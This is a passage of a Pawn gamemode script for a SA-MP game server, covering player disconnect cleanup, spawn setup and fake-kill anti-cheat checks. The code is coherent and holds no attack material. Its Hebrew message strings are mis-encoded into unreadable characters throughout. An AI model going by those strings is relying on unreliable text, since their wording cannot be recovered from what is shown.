			SendClientMessage(i,yellow,string);
			format(string,sizeof(string)," .схшь ыщ ф∙чўя фюуххч щщЎр юф∙°· %s Єь %s фущххч ∙Ё∙ьч Єь щущ",GetName(playerid),GetName(i));
			for(new j = 0; j < MAX_PLAYERS__; j++) if(IsPlayerConnected(j) && IsPlayerMAdmin(j)) SendClientMessage(j,red,string);
			playerinfo[i][reportid] = INVALID_PLAYER_ID;
			format(playerinfo[i][report],64,"");
		}
		if(playerinfo[i][answeredby] == playerid) playerinfo[i][answeredby] = INVALID_PLAYER_ID;
		if(playerinfo[i][igang] == playerid) playerinfo[i][igang] = INVALID_PLAYER_ID;
		if(playerinfo[i][iclan] == playerid) playerinfo[i][iclan] = INVALID_PLAYER_ID;
		if(playerinfo[i][iteam] == playerid) playerinfo[i][iteam] = INVALID_PLAYER_ID;
		if(playerinfo[i][iorg] == playerid) playerinfo[i][iorg] = INVALID_PLAYER_ID;
		if(playerinfo[i][friendask] == playerid) playerinfo[i][friendask] = INVALID_PLAYER_ID;
		//if(playerinfo[i][showstats] != playerid) UpdateStatsFields(i,"hide");
		if(playerinfo[i][paytimer][1] == playerid)
		{
			KillTimer(playerinfo[i][paytimer][0]);
			if(playerinfo[i][paytimer][2] == 0) SendClientMessage(i,yellow," (фыёє ьр Ё∙ьч ь∙чўя юыщххя ∙фхр щщЎр юф∙°· ьЇЁщ ∙ф∙ьщчф фх∙ьюф)");
			else if(playerinfo[i][paytimer][2] == 1) SendClientMessage(i,green," (фыёє юфрующя ьр Ё∙ьч ь∙чўя юыщххя ∙фхр щщЎр юф∙°· ьЇЁщ ∙ф∙ьщчф фх∙ьюф)");
			playerinfo[i][paytimer][1] = INVALID_PLAYER_ID, playerinfo[i][paytimer][2] = -1;
		}
	}
	if(playerinfo[playerid][paytimer][0] > 0)
	{
		KillTimer(playerinfo[playerid][paytimer][0]);
		if(playerinfo[playerid][paytimer][2] == 0) SendClientMessage(playerinfo[playerid][paytimer][1],yellow," (фыёє ьр Ё∙ьч рьщъ ыщ ф∙хьч щщЎр юф∙°· ьЇЁщ ∙ф∙ьщчф фх∙ьюф)");
		playerinfo[playerid][paytimer][1] = INVALID_PLAYER_ID, playerinfo[playerid][paytimer][2] = -1;
	}
	if(sellvadv[0] == playerid)
	{
		format(string,sizeof(string)," >> фхЇёўф ыщ щщЎр юф∙°· %s юыщ°· ф°ыс ∙ь",GetName(playerid));
		SendClientMessage(playerid,orange,string);
		//if(sellvadv[2] != -1) KillTimer(sellvadv[2]);
		StopVAdv();
	}
	if(auction[0] == playerid)
	{
		format(string,sizeof(string)," >> фхЇёўф ыщ щщЎр юф∙°· %s юыщ°· ф°ыс фЇхюсщ· ∙ь",GetName(playerid));
		SendClientMessage(playerid,orange,string);
		//if(auction[2] != -1) KillTimer(auction[2]);
		StopAuction();
	}
	if(auction[3] == playerid)
	{
		format(string,sizeof(string)," >> ∙Ёщёф ьўЁх· сюыщ°ф фЇхюсщ· сёыхэ фтсхф сщх·° Єу ыф щщЎр юф∙°· хьыя фюыщ°ф ю·чщьф ючу∙ юфёыхэ $%d ,%s",auction[1],GetName(playerid));
		SendClientMessage(playerid,orange,string);
		auction[3] = INVALID_PLAYER_ID;
	}
	if(claninfo[playerinfo[playerid][clan]][cinwar] && playerinfo[playerid][incwar])
	{
		playerinfo[playerid][incwar] = 0;
		new c = 0;
		format(string,sizeof(string)," .ыс° ьр с∙°· хьыя фхЎр рхшхюшщ· ююьчю· фўьрЁщэ %s",GetName(playerid));
		for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cwarplayers]; i++) if(claninfo[playerinfo[playerid][clan]][cwarplayer][i] == playerid) claninfo[playerinfo[playerid][clan]][cwarplayer][i] = INVALID_PLAYER_ID;
		for(new i = 0; i < MAX_PLAYERS__; i++) if(IsPlayerConnected(i) && playerinfo[i][incwar] && (playerinfo[i][clan] == playerinfo[playerid][clan] || playerinfo[i][clan] == claninfo[playerinfo[playerid][clan]][cwarasked][0]))
		{
			if(playerinfo[i][clan] == playerinfo[playerid][clan] && i != playerid) c++;
			SendClientMessage(i,red,string);
		}
		if(!c) EndClanWar(claninfo[playerinfo[playerid][clan]][cwarasked][0],playerinfo[playerid][clan],1);
	}
	if(playerinfo[playerid][lucifer])
	{
		playerinfo[playerid][lucifer] = 0;
		SetWeather(serverWeather = worlddef_weather);
		SetWorldTime(worlddef_time);
		News(" .рщцх фўьф, ф∙шя щщЎр юф∙°·");
	}
	if(playerinfo[playerid][pingtest][0]) EndPingTest(playerid);
	if(playerinfo[playerid][apingtest][0])
	{
		playerinfo[playerinfo[playerid][apingtest][1]][pingtest] = {0,0,0};
		playerinfo[playerid][apingtest] = {0,INVALID_PLAYER_ID};
	}
	TeamDefines(playerid);
	if(playerinfo[playerid][sgcomp] != -1) TakeSpecialComponent(playerid);
	if(playerinfo[playerid][useddevilcurse] != INVALID_PLAYER_ID)
	{
		StopUsingPower(playerinfo[playerid][useddevilcurse]);
		playerinfo[playerid][useddevilcurse] = INVALID_PLAYER_ID;
	}
	if(playerinfo[playerid][hqcheck] != -1) KillTimer(playerinfo[playerid][hqcheck]);
	if(lasttablekiller == playerid) lasttablekiller = INVALID_PLAYER_ID;
	if(playerinfo[playerid][speedo] != INVALID_PLAYER_TEXT_DRAW) Speedometer(playerid,"delete");
	if(playerinfo[playerid][boomtimer] != -1)
	{
		for(new i = 0; i < 2; i++)
		{
			TextDrawHideForPlayer(playerid,playerinfo[playerid][boomtd][i]);
			TextDrawDestroy(playerinfo[playerid][boomtd][i]);
		}
		playerinfo[playerid][boomtimer] = -1;
	}
	if(playerinfo[playerid][waterwalk][0]) DestroySObject(playerinfo[playerid][waterwalk][1]);
	for(new i = 0; i < ppt_count; i++) if(pptinfo[i][pptValid] && playerinfo[playerid][ppts][i] != (PlayerText3D:1024)) DeletePlayer3DTextLabel(playerid,playerinfo[playerid][ppts][i]);
	format(string,sizeof(string),"Admin.%03d",playerid);
	for(new i = 0; i < MAX_ADMIN_TELEPORTS; i++) if(AdminTeleports[i][Ttype] == tele_normal && equal(AdminTeleports[i][Tauthor],string))
	{
		format(AdminTeleports[i][Tauthor],32,"");
		AdminTeleports[i][Ttype] = tele_none;
	}
	dbg(4,"12");
	if(playerinfo[playerid][vtemp] != INVALID_VEHICLE_ID)
	{
		DestroyVehicleEx(playerinfo[playerid][vtemp]);
		playerinfo[playerid][vtemp] = INVALID_VEHICLE_ID;
		if(playerinfo[playerid][tdmzone] == tdmz_heavy) playerinfo[playerid][tooktempickup] = 0;
	}
	Border(playerid,"delete");
	if(pirateUser[0] == playerid) ReloadPirateShip();
	if(playerinfo[playerid][lastv] != INVALID_VEHICLE_ID) if(vehicleinfo[playerinfo[playerid][lastv]][vvalid] && vehicleinfo[playerinfo[playerid][lastv]][locked] && playerid == vehicleinfo[playerinfo[playerid][lastv]][lastdriver])
	{
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) SetVehicleParamsForPlayer(playerinfo[playerid][lastv],i,0,0);
		vehicleinfo[playerinfo[playerid][lastv]][locked] = 0, vehicleinfo[playerinfo[playerid][lastv]][lastdriver] = INVALID_PLAYER_ID;
	}
	if((GetOnlinePlayers() / 12) > GetOnlineAdmins()) AdminNotification("minority","there is a need for more admins","read",5,adminot_minority);
	if(playerinfo[playerid][entermessage][0] != -1 && IsValidDynamicObject(playerinfo[playerid][entermessage][2])) DestroyDynamicObject(playerinfo[playerid][entermessage][2]);
	if(playerinfo[playerid][gambleimg][0] != INVALID_PLAYER_TEXT_DRAW || playerinfo[playerid][gambleinfo][0])
	{
		GamblingFunction(playerid,"end");
		if(playerinfo[playerid][gambleimg][0] != INVALID_PLAYER_TEXT_DRAW) for(new i = 0; i < 4; i++) PlayerTextDrawDestroy(playerid,playerinfo[playerid][gambleimg][i]);
	}
	if(playerinfo[playerid][admingangzone] != INVALID_GANG_ZONE)
	{
		GangZoneHideForAll(playerinfo[playerid][admingangzone]);
		GangZoneDestroy(playerinfo[playerid][admingangzone]);
	}
	ResetInfo(playerid,1);
	playerinfo[playerid][pp] = 0;
	for(new i=0;i<icons_count;i++) RemovePlayerMapIcon(playerid,i);
	dbg(4,"13");
	if(!Options[2][optActive] && !equal(playerinfo[playerid][playerip],lastConnectIP))
	{
		format(string,sizeof(string)," *** " @c(grey) "%s has left the server. (%s)",GetName(playerid),reas);
		for(new i=0;i<MAX_PLAYERS__;i++) if(IsPlayerConnected(i) && i != playerid && playerinfo[i][setting][setting_showquit]) SendClientMessage(i,darkred,string);
	}
	//if(playerinfo[playerid][isbanned]) playerinfo[playerid][isbanned] = false;
	ResetAttachedObjects(playerid);
	dbg(4,"14");
	if(lastB == playerid) lastB = INVALID_PLAYER_ID, lastBType = 0, lastAdvMessage = "", advAccess = 0;
	if(lastbaner == playerid) lastbaner = INVALID_PLAYER_ID, lastbanerbans = 0, lastbanerdelay = 0;
	if(bottalkingto == playerid) bottalkingto = INVALID_PLAYER_ID, botdelay[0] = 0;
	for(new v = 0; v < max_vehicles_; v++) if(vehicleinfo[v][vvalid] && vehicleinfo[v][locked] && playerid == vehicleinfo[v][lastdriver])
	{
		for(new i = 0; i < MAX_PLAYERS__; i++) if(IsPlayerConnected(i)) SetVehicleParamsForPlayer(v,i,0,0);
		vehicleinfo[v][locked] = 0, vehicleinfo[v][lastdriver] = INVALID_PLAYER_ID;
	}
	dbg(4,"15");
	if(IsPlayerInAnyVehicle(playerid) && vehicleinfo[GetPlayerVehicleID(playerid)][vspecial]) SpawnSpecialVehicle(GetPlayerVehicleID(playerid));
	for(new i = 0; i < sizeof(lastCMDUsers); i++) if(lastCMDUsers[i][lcuID] == playerid) lastCMDUsers[i][lcuID] = -1;
	dbg(4,"16");
	if(headserver == playerid) StartHeadServer(0);
	format(playerinfo[playerid][playername],MAX_PLAYER_NAME,"None");
	format(playerinfo[playerid][playerip],16,"Unknown");
	connected[playerid] = false;
	if(debugstate) printf("OnPlayerDisconnect(%s(%d),%d) end",GetName(playerid),playerid,reason);
	#if lagtest
		LagTest_End("OnPlayerDisconnect");
	#endif
	return 1;
}
//=[OnPlayerSpawn]==============================================================
public OnPlayerSpawn(playerid)
{
	if(debugstate) printf("OnPlayerSpawn(%s(%d)) start",GetName(playerid),playerid);
	#if lagtest
		LagTest_Start("OnPlayerSpawn");
	#endif
	if(IsPlayerNPC(playerid))
	{
		if(waitingConnections == 0)
		{
			new npcid = playerinfo[playerid][selfnpc] = GetNPCID(GetName(playerid));
			if(npcid == -1) return 1;
			if(NPCs[npcid][npcVehicle]) PutPlayerInVehicle(playerid,npcVehicles[npcid],NPCs[npcid][npcVehicleSeat]);
			if(!NPCs[npcid][npcVehicle] && NPCs[npcid][npcPos][0] != 0.0)
			{
				SetPlayerPos(playerid,NPCs[npcid][npcPos][0],NPCs[npcid][npcPos][1],NPCs[npcid][npcPos][2]);
				SetPlayerFacingAngle(playerid,NPCs[npcid][npcPos][3]);
			}
			SetPlayerInterior(playerid,NPCs[npcid][npcInterior]);
			SetPlayerVirtualWorld(playerid,NPCs[npcid][npcWorld]);
			new npcC = rgba2hex(random(256),random(256),random(256),PLAYER_ALPHA);
			SetPlayerColor(playerid,npcC);
			if(NPCs[npcid][npcText] != (Text3D:-1024))
			{
				if(NPCs[npcid][npcText] != (Text3D:1024)) Delete3DTextLabel(NPCs[npcid][npcText]);
				NPCs[npcid][npcText] = Create3DTextLabel(NPCs[npcid][npcName],setAlpha(npcC,255),0.0,0.0,0.0,50.0,0,0);
				Attach3DTextLabelToPlayer(NPCs[npcid][npcText],playerid,0.0,0.0,-0.2);
			}
			SetPlayerSkin(playerid,NPCs[npcid][npcSkin]);
		}
		else
		{
			waitingConnections--;
			currentShowNPCs[waitingForNPCConnection[waitingConnections][0]] = playerid, waitingForNPCConnection[waitingConnections][0] = -1;
			SetPlayerSkin(playerid,waitingForNPCConnection[waitingConnections][1]);
			SetPlayerPos(playerid,theNewNPCPos[waitingConnections][0],theNewNPCPos[waitingConnections][1],theNewNPCPos[waitingConnections][2]);
			SetPlayerFacingAngle(playerid,theNewNPCPos[waitingConnections][3]);
			SetPlayerVirtualWorld(playerid,world_show);
		}
		if(serverMsgExist) ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "фхуЄф юЄ°ы·",serverMsg,"OK","");
  		SetPlayerColor(playerid,rgba2hex(random(256),random(256),random(256),PLAYER_ALPHA));
        //SetCameraBehindPlayer(playerid);
		return 1;
	}
	if(playerinfo[playerid][firstspawn])
  	{
  	    Border(playerid,"create");
  		SendClientMessage(playerid,red,"ю·сЎЄ· сущўф... рЁр фю·я ыюф ∙Ёщх·");
        SetCameraBehindPlayer(playerid);
        SetFreeze(playerid,1);
        SetTimerEx("HackCheck",4000,0,"d",playerid);
	}
	if(playerinfo[playerid][naorslap]) playerinfo[playerid][naorslap] = false, SetPlayerWorldBounds(playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000);
	playerinfo[playerid][alive] = 1;
	playerinfo[playerid][curfight] = 0;
	SetPlayerVirtualWorld(playerid,world_normal);
	PlayerPlaySound(playerid,start_sound+1,-2643.2712,-15.8934,13.6365);
	ResetWeapons(playerid);
	SetPlayerHealth(playerid,100.0);
	if(playerinfo[playerid][ammuitems][ai_armour])
	{
		SetPlayerArmour(playerid, 100.0);
		TakeAmmuItemAmmo(playerid,ai_armour);
	}
	ResetAttachedObjects(playerid);
	if(playerinfo[playerid][clothes] > -1 || playerinfo[playerid][clothes2] > -1) RefreshClothes(playerid);
	playerinfo[playerid][frozen] = {0,0};
	if(fexist(fuser(playerid)) && !playerinfo[playerid][logged]) return SetKick(playerid,INVALID_PLAYER_ID,"Ёщёщхя Ї°щЎф ью∙·ю∙");
	if(playerinfo[playerid][admlog] == 1 && playerinfo[playerid][adminone])
	{
		SetFreeze(playerid,1);
		SendClientMessage(playerid,green," /admlog [password] :рЁр фўьу ёщёю· рующя");
	}
	SetPlayerWeather(playerid,serverWeather);
	playerinfo[playerid][die] = 0;
	playerinfo[playerid][incrane] = 0;
	if(playerinfo[playerid][wehateyou] != -1) SetPlayerHealth(playerid,0.0);
	for(new i=0;i<11;i++) playerinfo[playerid][death][i] = 0;
	if(playerinfo[playerid][class] == randclass)
	{
		new s = random(312);
		while(!IsValidSkin(s)) s = random(312);
		SetPlayerSkin(playerid,s);
	}
	dbg(5,"1");
	playerinfo[playerid][reqclass] = 0;
	//SetCameraBehindPlayer(playerid);
	new string[M_S], Float:p[6];
	if(playerinfo[playerid][dmzone] == dmz_none && playerinfo[playerid][tdmzone] == tdmz_none)
	{
		if(playerinfo[playerid][setspawn][0])
		{
			SetPlayerPos(playerid,playerinfo[playerid][setspawnp][0],playerinfo[playerid][setspawnp][1],playerinfo[playerid][setspawnp][2]);
			SetPlayerFacingAngle(playerid,playerinfo[playerid][setspawnp][3]);
			SetPlayerInterior(playerid,playerinfo[playerid][setspawn][1]);
			SetPlayerVirtualWorld(playerid,playerinfo[playerid][setspawn][2]);
			for(new i = 0; i < 4; i++) p[i] = playerinfo[playerid][setspawnp][i];
		}
		else
		{
			if(GetPlayerSkin(playerid) >= 280 && GetPlayerSkin(playerid) <= 287)
			{
				new rnd = random(sizeof(RandomCopSpawns));
				SetPlayerPos(playerid,RandomCopSpawns[rnd][rsX],RandomCopSpawns[rnd][rsY],RandomCopSpawns[rnd][rsZ]);
				SetPlayerFacingAngle(playerid,RandomCopSpawns[rnd][rsA]);
				SetPlayerInterior(playerid,RandomCopSpawns[rnd][rsI]);
				p[0] = RandomCopSpawns[rnd][rsX], p[1] = RandomCopSpawns[rnd][rsY], p[2] = RandomCopSpawns[rnd][rsZ], p[3] = RandomCopSpawns[rnd][rsA];
			}
			else
			{
				new rnd = random(sizeof(RandomSpawns));
				SetPlayerPos(playerid,RandomSpawns[rnd][rsX],RandomSpawns[rnd][rsY],RandomSpawns[rnd][rsZ]);
				SetPlayerFacingAngle(playerid,RandomSpawns[rnd][rsA]);
				SetPlayerInterior(playerid,RandomSpawns[rnd][rsI]);
				p[0] = RandomSpawns[rnd][rsX], p[1] = RandomSpawns[rnd][rsY], p[2] = RandomSpawns[rnd][rsZ], p[3] = RandomSpawns[rnd][rsA];
			}
			SetPlayerVirtualWorld(playerid,world_normal);
		}
		GiveWeapon(playerid,ChoosenWeapon(playerid,wtype_pistol),1000);
		for(new i=0;i<10;i++)
		{
			if(playerinfo[playerid][spweapon] != spw_none && spAmmunation[playerinfo[playerid][spweapon]][spaWeapon] > 0 && GetWeaponSlot(playerinfo[playerid][weapons][i]) == GetWeaponSlot(spAmmunation[playerinfo[playerid][spweapon]][spaWeapon])) continue;
			GiveWeapon(playerid,playerinfo[playerid][weapons][i],i == 9 || i == 8? 1:(GetAmmunationAmmo(playerinfo[playerid][weapons][i])*(playerinfo[playerid][ammo][i] > 100 ? 100 : playerinfo[playerid][ammo][i])));
		}
		if(playerinfo[playerid][spweapon] != spw_none && spAmmunation[playerinfo[playerid][spweapon]][spaWeapon] > 0) DefineSPWGun(playerid,playerinfo[playerid][spweapon],1);
		SetPlayerArmedWeapon(playerid,0);
		p[4] = p[0] + (5.0 * floatsin(-p[3],degrees)), p[5] = p[1] + (5.0 * floatcos(-p[3],degrees));
		if(playerinfo[playerid][setting][setting_telecam])
		{
			InterpolateCameraPos(playerid,p[0],p[1],p[2]+15.0,p[0],p[1],p[2],2000,CAMERA_MOVE);
			InterpolateCameraLookAt(playerid,p[0],p[1],p[2],p[4],p[5],p[2],2000,CAMERA_MOVE);
			playerinfo[playerid][interpolating][0] = 3, playerinfo[playerid][interpolating][1] = ipath_spawn;
		}
	}
	else
	{
		playerinfo[playerid][returntodm] = 1;
		if(playerinfo[playerid][dmzone] != dmz_none)
		{
		    if(playerinfo[playerid][dmzone] == dmz_boats)
		    {
		    	new rnd = random(sizeof(DMZ_Boats));
		    	DestroyVehicle(playerinfo[playerid][bvehicle]);
				playerinfo[playerid][bvehicle] = CreateVehicle(430,DMZ_Boats[rnd][0],DMZ_Boats[rnd][1],DMZ_Boats[rnd][2],DMZ_Boats[rnd][3],255,0,-1);
				PutPlayerInVehicle(playerid,playerinfo[playerid][bvehicle],0);
		    }
			if(playerinfo[playerid][dmworld] == 1) command(playerid,DMZs[playerinfo[playerid][dmzone]][dmzCmd]);
			else
			{
				format(string,sizeof(string),"%s %d",DMZs[playerinfo[playerid][dmzone]][dmzCmd],playerinfo[playerid][dmworld]);
				command(playerid,string);
			}
		}
		else if(playerinfo[playerid][tdmzone] != tdmz_none) OnDialogResponse(playerid,playerinfo[playerid][indialog] = dialog_tdm2,1,playerinfo[playerid][tdmclick][2],"");
		playerinfo[playerid][returntodm] = 0;
	}
	dbg(5,"2");
	GetPlayerPos(playerid,playerinfo[playerid][startpos][0],playerinfo[playerid][startpos][1],playerinfo[playerid][startpos][2]);
	TeamDefines(playerid);
	if(playerinfo[playerid][spawned] == 0)
	{
		format(string,sizeof(string),"~y~welcome~n~~h~%s",GetName(playerid));
		GameTextForPlayer(playerid,string,3000,1);
		RemoveBuildings(playerid);
		playerinfo[playerid][spawned] = 1;
		for(new i=0;i<sizeof(CastlesAreas);i++) if(cainfo[i][caGangZone] != -1) GangZoneShowForPlayer(playerid,cainfo[i][caGangZone],rgba2hex(CastlesAreas[i][caColorR],CastlesAreas[i][caColorG],CastlesAreas[i][caColorB],250));
		for(new i=0;i<sizeof(MoneyAreas);i++) if(MoneyAreas[i][maGangZoneID] != -1) GangZoneShowForPlayer(playerid,MoneyAreas[i][maGangZoneID],0x0080FF78);
		GangZoneShowForPlayer(playerid,vgangzone,0xFF800096);
		SetPlayerColor(playerid,GetColor(playerid,PLAYER_ALPHA));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,PLAYER_ALPHA));
		SetPlayerMapIcon(playerid,icon_bank,-22.3137,-55.2263,1003.5468,52,0);
		SetPlayerMapIcon(playerid,icon_wang,2636.8041,-2001.9831,13.5544,55,0);
		SetPlayerMapIcon(playerid,icon_wang2,-1928.9987,272.5292,41.0468,55,0);
		SetPlayerMapIcon(playerid,icon_race,2057.3232,843.6667,6.7031,53,0);
		SetPlayerMapIcon(playerid,icon_lvap,1667.1559,1594.8059,10.8203,5,0);
		SetPlayerMapIcon(playerid,icon_sfap,-1353.9729,-512.2011,14.1719,5,0);
		SetPlayerMapIcon(playerid,icon_lsap,1415.6378,-2497.6167,13.5547,5,0);
		SetPlayerMapIcon(playerid,icon_ships,2293.9980,523.9903,1.7944,9,0);
		SetPlayerMapIcon(playerid,icon_docks,-1655.0560,1299.1433,7.0391,9,0);
		SetPlayerMapIcon(playerid,icon_quarry,671.7627,886.9266,-40.3067,11,0);
		SetPlayerMapIcon(playerid,icon_pirate,2000.7985,1538.2964,13.5859,23,0);
		SetPlayerMapIcon(playerid,icon_sgarage,1080.0285,1937.4846,10.8129,55,0);
		SetPlayerMapIcon(playerid,icon_lighthouse,154.2227,-1945.5432,4.7210,44,0);
		for(new i = 0; i < max_properties; i++) if(propinfo[i][pcost] > 0) SetPlayerMapIcon(playerid,icons_properties+i,propinfo[i][px],propinfo[i][py],propinfo[i][pz],31,0);
		for(new i = 1; i < MAX_CLANS; i++) if(claninfo[i][cvalid] && claninfo[i][cgzoneshow] && claninfo[i][cgzone] != INVALID_GANG_ZONE) GangZoneShowForPlayer(playerid,claninfo[i][cgzone],rgba2hex(claninfo[claninfo[i][cruler]][ccolor][0],claninfo[claninfo[i][cruler]][ccolor][1],claninfo[claninfo[i][cruler]][ccolor][2],150));
		for(new x; x < MAX_VIEWHQS; x++) if(viewhqinfo[x][hqvalid]) GangZoneShowForPlayer(playerid, viewhqinfo[x][hqzone], 0xC0C0C0CC);
		for(new i = 0; i < ppt_count; i++) if(pptinfo[i][pptValid] && playerinfo[playerid][ppts][i] == (PlayerText3D:1024))
		{
			switch(pptinfo[i][pptType])
			{
				case ppt_bank: format(string,sizeof(string),@c(yellow) "ёыхэ фыёє ссЁў ∙ьъ:\n" @c(green) "%d$",playerinfo[playerid][bank]);
				default: string = " ";
			}
			playerinfo[playerid][ppts][i] = CreatePlayer3DTextLabel(playerid,string,white,pptinfo[i][pptPos][0],pptinfo[i][pptPos][1],pptinfo[i][pptPos][2],pptinfo[i][pptDrawDistance],1);
		}
		if(pastatus > 0) GangZoneShowForPlayer(playerid,pickactzone,pastatus == 1 ? green : yellow);
		if(specialActivity == sa_ftt) GangZoneShowForPlayer(playerid,FTTGangZone,setAlpha(purple,120));
		if(strlen(adminmusic) > 2)
		{
			PlayAudioStreamForPlayer(playerid,adminmusic);
			SendClientMessage(playerid,grey,"(/play :ьфЇЄьф счц°ф ,/saudio :ьыщсхщ фюхцщўф)");
		}
		PreloadAnimLib(playerid,"BOMBER");
		PreloadAnimLib(playerid,"RAPPING");
		PreloadAnimLib(playerid,"SHOP");
		PreloadAnimLib(playerid,"BEACH");
		PreloadAnimLib(playerid,"SMOKING");
		PreloadAnimLib(playerid,"FOOD");
		PreloadAnimLib(playerid,"ON_LOOKERS");
		PreloadAnimLib(playerid,"DEALER");
		PreloadAnimLib(playerid,"CRACK");
		PreloadAnimLib(playerid,"CARRY");
		PreloadAnimLib(playerid,"COP_AMBIENT");
		PreloadAnimLib(playerid,"PARK");
		PreloadAnimLib(playerid,"INT_HOUSE");
		PreloadAnimLib(playerid,"FOOD");
		PreloadAnimLib(playerid,"PED");
		PreloadAnimLib(playerid,"KISSING");
		Border(playerid,"update");
	}
	if(playerinfo[playerid][bordershow]) Border(playerid,"show");
	for(new ii=0;ii<MAX_PLAYERS_;ii++)
	{
		if(IsPlayerConnected(ii))
		{
			ShowPlayerNameTagForPlayer(ii,playerid,1);
			SetPlayerMarkerForPlayer(ii,playerid,GetColor(playerid,PLAYER_ALPHA));
		}
	}
	playerinfo[playerid][invisible] = 0;
	dbg(5,"3");
	/*if(!GetMoney(playerid) && !playerinfo[playerid][spawnmoneydelay] && playerinfo[playerid][dmzone] == dmz_none && playerinfo[playerid][tdmzone] == tdmz_none)
	{
		GiveMoney(playerid,spawnmoney, 1);
		playerinfo[playerid][spawnmoneydelay] = 60;
	}*/
	if(playerinfo[playerid][skin] != -1) SetPlayerSkin(playerid,playerinfo[playerid][skin]);
	if(!playerinfo[playerid][gmtimer])
	{
		SetPlayerHealth(playerid,100000.0);
		playerinfo[playerid][gmtimer] = 2, playerinfo[playerid][gmlasthp] = 100.0;
	}
	dbg(5,"4");
	playerinfo[playerid][lastskin] = GetPlayerSkin(playerid);
	if(playerinfo[playerid][diehard][0])
	{
		playerinfo[playerid][diehard][0] = 0;
		KillTimer(playerinfo[playerid][diehard][1]);
	}
	if(playerinfo[playerid][lifegood][0])
	{
		playerinfo[playerid][lifegood][0] = 0;
		KillTimer(playerinfo[playerid][lifegood][1]);
	}
	if(playerinfo[playerid][p3dtext] != Text3D:INVALID_3DTEXT_ID) RemovePlayerAttachedText(playerid);
	playerinfo[playerid][dontwac] = 1;
	playerinfo[playerid][changedinterior] = 0;
	playerinfo[playerid][usedkill] = 0;
	playerinfo[playerid][usedammu] = false;
	GiveWeapon(playerid,0,1);
	if(playerinfo[playerid][erasehurt]) playerinfo[playerid][erasehurt] = 0;
	if(playerinfo[playerid][inact]) OutOfActivity(playerid);
	dbg(5,"5");
	if(playerinfo[playerid][viewingvehicle] != -1)
	{
		LoadPlayerPos(playerid,1);
		playerinfo[playerid][viewingvehicle] = -1;
	}
	if(playerinfo[playerid][loadpos]) LoadPlayerPos(playerid,1);
	if(playerinfo[playerid][level] >= 1 && playerinfo[playerid][level] < sizeof(levels)-1) if(levels[playerinfo[playerid][level]+1][NeedKills]-playerinfo[playerid][kills] <= 0) PlayerLevelUp(playerid);
	if(playerinfo[playerid][sguard][0]) SetPlayerWaveLevel(playerid,waves); // guard_shit
	if(playerinfo[playerid][frozen][1]) SetFreeze(playerid, 1, true);
	#if lagtest
		LagTest_End("OnPlayerSpawn");
	#endif
	if(debugstate) printf("OnPlayerSpawn(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[OnPlayerDeath]==============================================================
public OnPlayerDeath(playerid, killerid, reason)
{
	if(debugstate) printf("OnPlayerDeath(%s(%d),%d,%d) start",GetName(playerid),playerid,killerid,reason);
	#if lagtest
		LagTest_Start("OnPlayerDeath");
	#endif
	new string[M_S];
	playerinfo[playerid][entertime] += 221;
	playerinfo[playerid][dontwac] = 1;
	playerinfo[playerid][usedammu] = false;
	playerinfo[playerid][deathdelay] = 30;
	playerinfo[playerid][curfight] = 0;
	playerinfo[playerid][phealth] = 0.0;
	playerinfo[playerid][parmour] = 0.0;
	if(playerinfo[playerid][usedkill]) killerid = INVALID_PLAYER_ID, reason = 53;
	GetPlayerPos(playerid,playerinfo[playerid][deathpos][0],playerinfo[playerid][deathpos][1],playerinfo[playerid][deathpos][2]);
	serverDetails[sdDeaths][0]++;
	dbg(6,"1");
	playerinfo[playerid][die]++;
	if(killerid != INVALID_PLAYER_ID)
	{
		if(GetPVarType(playerid,dmgformat(killerid)) == PLAYER_VARTYPE_NONE) AdminInfo(killerid,"Fake kill?");
		new bool:weired = GetPlayerWeapon(killerid) != reason && reason >= 0 && reason <= 46 && reason < 19 && reason > 21;
		if(playerinfo[killerid][kills] < 0) return Cheat(killerid,"Fake kill",1);
		if(reason == 47 || reason == 52 || reason == 53 || reason >= 55 || reason < 0) return Cheat(playerid,"Fake kill",1);
		if(reason >= 0 && reason <= 54 && !IsPlayerMAdmin(playerid))
		{
		    new bool:flag = false;
			if(playerinfo[playerid][die] > 1 || !playerinfo[playerid][alive] ||
			(GetDistanceBetweenPlayers(playerid,killerid) > 75.0 && reason != 34 && reason != 33 && reason != 31 && reason != 30) ||
			//(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT && GetPlayerState(playerid) != PLAYER_STATE_PASSENGER && GetPlayerState(playerid) != PLAYER_STATE_DRIVER) ||
			GetPlayerState_Original(playerid) != PLAYER_STATE_WASTED ||
			!playerinfo[killerid][damageforid][playerid] ||
			weired) playerinfo[playerid][fkwarns]++;
			if(playerinfo[playerid][fkwarns] >= 2)
			{
				playerinfo[killerid][kills] -= playerinfo[killerid][killsforid][playerid], flag = true, playerinfo[killerid][killsforid][playerid] = 0;
				Cheat(playerid,"Fake kill",1);
			}
			if(flag) return 1;
		}
		if(reason == 51 && killerid != INVALID_PLAYER_ID && (GetPlayerWeapon(killerid) == 35 || GetPlayerWeapon(killerid) == 36 || GetPlayerWeapon(killerid) == 16)) reason = GetPlayerWeapon(killerid);
		playerinfo[killerid][damageforid][playerid] = false;
	}
	for(new i = 0, upp = GetPVarsUpperIndex(playerid) + 1; i < upp; i++)
	{
	    GetPVarNameAtIndex(playerid,i,string,sizeof(string));
	    if(GetPVarType(playerid,string) != PLAYER_VARTYPE_NONE && strfind(string,"dmgformat_") != -1) DeletePVar(playerid,string);
	}
	playerinfo[playerid][alive] = 0;
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][pump] == playerid)
	{
		SendClientMessage(i,red," .ф°т· р· ф∙чўя ююЁх ∙рс·");
		playerinfo[i][pump] = INVALID_PLAYER_ID;
		killerid = i, reason = 53;
	}
	SendDeathMessage(killerid,playerid,reason);
	if(lasttablekiller != killerid)
	{
		new doneTable = 0, maxrows = sizeof(deathtable);
		for(new i = 0; i < maxrows; i++) if(deathtable[i][0] == killerid && deathtable[i][1] != INVALID_PLAYER_ID) doneTable++;
		if(doneTable == maxrows)
		{
			format(string,sizeof(string)," {%s}!%s шсь· фф°щтх· ∙щщы· ь",HexStringOfColor(GetPlayerColor(killerid)),GetName(killerid));
			News(string);
